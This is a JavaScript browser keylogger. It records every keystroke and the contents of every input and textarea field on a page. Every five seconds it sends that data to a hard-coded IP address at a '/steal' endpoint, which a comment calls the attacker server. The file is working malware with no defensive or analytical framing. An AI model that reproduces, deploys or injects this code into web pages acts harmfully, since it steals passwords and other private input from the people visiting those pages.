let keystrokeBuffer = "";
let inputLogs = [];

// Capture keystrokes
document.addEventListener("keydown", function (event) {
  keystrokeBuffer += event.key;
});

// Capture input and textarea changes
document.addEventListener("input", function (event) {
  if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
    inputLogs.push({
      field: event.target.name || "unknown",
      value: event.target.value,
      time: new Date().toISOString()
    });
  }
});

// Send data to attacker server every 5 seconds
setInterval(function () {
  if (keystrokeBuffer.length === 0 && inputLogs.length === 0) return;

  const data = {
    keys: keystrokeBuffer,
    inputs: inputLogs,
    time: new Date().toISOString()
  };

  fetch("http://20.197.10.26/steal", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  }).catch(err => console.error("Keylogger send failed:", err));

  // Reset buffers
  keystrokeBuffer = "";
  inputLogs = [];
}, 5000);
